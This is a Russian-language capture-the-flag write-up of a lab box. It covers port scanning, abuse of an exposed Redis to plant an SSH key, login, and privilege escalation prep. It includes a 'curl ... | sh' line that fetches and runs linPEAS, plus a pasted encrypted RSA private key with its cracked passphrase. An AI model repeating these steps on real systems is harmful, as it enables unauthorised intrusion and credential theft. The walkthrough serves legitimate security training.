итак начнём

для начала просканируем порты:
![](./imgs/nmap.jpg)
так, мы выяснили что у нас открыты порты:
22 и 2222 - для доступа по ssh (нам пока не интересен , т.к у нас нет ни пароля, ни ключа)
80(http) и 443(https) (тоже не интересно (принадляжат какомуто сайту))
6379 - redis (а вот это уже интересно)

так мы узнали что здесь стоит БД-redis , при этом нам даже дали пароль к ней: surctfredis
а теперь нам нужно узнать как к ней подключиться:
![](imgs/redis_how_to_connect.jpg)
так теперь нам нужно установить redis-tools , в котором есть утилита redis-cli для подключения к БД redis:
![](imgs/redis_tools_install.jpg)
теперь можно попробовать подключиться:
![](imgs/rediscliconn.jpg)
ураа мы подключились, но что дальше?
дальше нам нужно найти RCE эксплойт (Remote Code Execution):
![](imgs/redisrceexplotation.jpg)
![](imgs/how_to_add_your_public_sshkey.jpg)
для начала сгенерируем свой SSH ключик
![](imgs/sshkeygen.jpg)
затем закинем его в файлик перед этим добавив в него пустые строки в начале и в конце, а также импортируем его в redis:
![](imgs/savepubkeyastxtwithnewlines_and_importthemtoredis.jpg)
есть, мы сохранили наш ключик в ключ(переменную) с названием ssh_key
теперь снова подключимся к редису и попробуем сменить нашу директорию на .ssh/ , у пользователя redis:
![](imgs/redissetconfigdirtosshfolderfailure.jpg)
не получилось из-за того что конфиг защещён
ладно тогда посмотрим где мы есть:
![](imgs/configsshNICE.jpg)
оо дак здесь по дефолту стоит папка с ключами , ничёсе.
тогда просто сохраним и проверим наш ключик: 
![](imgs/YeahWeDidIt.jpg)
вроде получилось , попробуем подключиться по ssh c нашим ключиком:
![](imgs/NiceSSH.jpg)
есть ураааа , мы подключены.
теперь нам нужно повысить свои привелегии.
есть такая утилита- linPEAS, она нужно чтобы посмотреть возможные уязвимости [ссылка](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS):
Вот команда для быстрого старта linPEAS 
>  curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

ну что запускаем и смотрим.
где то в серидине она выдала нам ключик от пользователя test:
![](imgs/sshbackupkeyfound.jpg)
сохраним его командой:
>echo "-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6DE64BB52B779C56DC5B28F04988FB4C
>
>+eGzLWPQCs2RC0gu94QzDHLJEsck9qkm5LgqOAoHGjrShGtb80XODWHdzE+PADUL
r4dUdfhV4+n+udALipoaYcwYDZnqUzBqSRjG9/4baisuoYK6PNki8kXm5JAbv5gG
8bSwCKITctOHX57340RNsEdZPYjz0bDzRTd1Bqv5OALChtBxXrzxIG41Ud6ydpgQ
kR4Xjq2l0j58sUOkDPkyTwBvy/gWenMcKYBDEPNTbaSZkstqJXBKGsSGhmLlUhEB
em01BwMAVbZROr22XkbIjEiXwPNgSMKFaCI+mShB4/KiflogZWPqdE0MYOTiVPuK
J1zAfYf7fi85Dj9XjEJicmE/6TkY1VdSj6n8XcIrxcghXt5Lbfi5LR7k5khh+P1d
qBFhgAy3hGEJzx+zFWMXfbgxVs8gN9BuJtJDcAj6t6zJrJ+UMAPGwfq+u/csem/T
AQPCJA2En/iRfzCYmqnFw9A7jCXzvUhyhKw6/idxZDQ8jf8hv0cVCeZPHcU2RlzB
+30s0P81C2LOGNmyR5K/9qPBjTnTYoCReUtMbmzoFqApTCF20EzGWFAMwIaOYfBJ
bnBf9m8QK1l0omDOhc2n4wO0+p+6lHlflUbURqJiuDkHgqVIluX+c5sCprzmAp8Z
9DucdBhkDujj3NVN5VKN47v8TI9u0lGqbFJx3qLDhAFyizAJovSrC/VXAFm9wQc/
13Z+xmQ1QKcYVfOsF50orVjhYQe1xrxEeCToagH+1aMFbqpVW35hA05gGWcLkr78
tolI4IOaOhjbcvMmv+FyZXWQPhrfnj0EWpVy5mvK7CdyQKJqpUqCqqmgwJcG3Kbe
bwsr/SInYdhHPHINcZDuq/ik55ekk6RMRAPcfpYuMOjKDKzHqzCoj1oFT3UrYaAR
w37GGqknQi1DJDHTc+slsx7YFFPlUBA9/m9kxXg0DyiAHLiuv5pxeBjRXM52YPSh
fa255QTwfiNCQeixUauxjQcIR2JRJnMjRpefKdt/xdGEBwNrKJdLP38olZNV+TNs
lzzZkw72YhDfUfWxAMNW48JDK96V+uaHc0WrX5HadzIx/mlueBH2tG/PJNDKaXAf
ri+v8N0MZhBlqeNweGhBUMOL87OiSd2zV2sWHsGF/V+ociC0PjBUR3XrNd6YKQM0
4p1yDWfmkFqAmd/+Bf9t+wvGvEgkAl0JY1nuc69mSKmI+CRbBnG4lvcDq6h5sX66
VwqUugTQtQUzHrnaGy46AK/a199F21wnSsLXWGBCFSIjgQ2rGDEMmwc09PYCuH1L
xsTYTXpq0R1ZQkwK/eX3MSBTTcYvMLt13Rukz2YhLt6gFvw3bAVx9hYAeIV36/Fd
/hdzSXQ86DbIr7v839gTX5CO0+OsMzukHfqg1SCvB3BFLu4SEmvBD5pmTy6LGIjt
HZKz2Al0YUSrpV0rwEsQ2701S9VHnDPpTeeUsJFuLOq3792F308q7n6BJHby++my
N/q2JNbjSmmlUcJPttlV8C9cyTCEXpM1lnz8HHyJPvUvfmX2frB1BdHPKKb5SrjZ
Ujf6vp7pIjsgq9nEVCSIqymqde3mBrTEEB4qS0hTn/fSu27PcYeuiDh07XQ9FX6W
-----END RSA PRIVATE KEY-----" > hellokey

![](imgs/keyssh.jpg)

поменяем ему права доступа на 600 и попробуем подключиться:
![](imgs/sshtrytoconnectfixpermissionsandpassword.jpg)
о нет он зашифрован , будем брутфорсить.
для начала распакуем словарь rockyou, в kali linux он по умолчанию находится в /usr/share/wordlists/rockyou.txt.gz :
![](imgs/unpackdefaultrockyouinkali.jpg)
теперь переделаем наш ключ в хэш для john:
![](imgs/ssh2john.jpg)
и теперь можно брутить:
![](imgs/bruteforce.jpg)
так теперь мы знаем пароль от ключа, попробуем подключиться по ssh с паролем - pokemon, и взять флаг в user.txt:
![](imgs/connect_ls_catusertxt_and_getflag.jpg)
Урра наш флаг:
>surctf_f1rst_p3ntest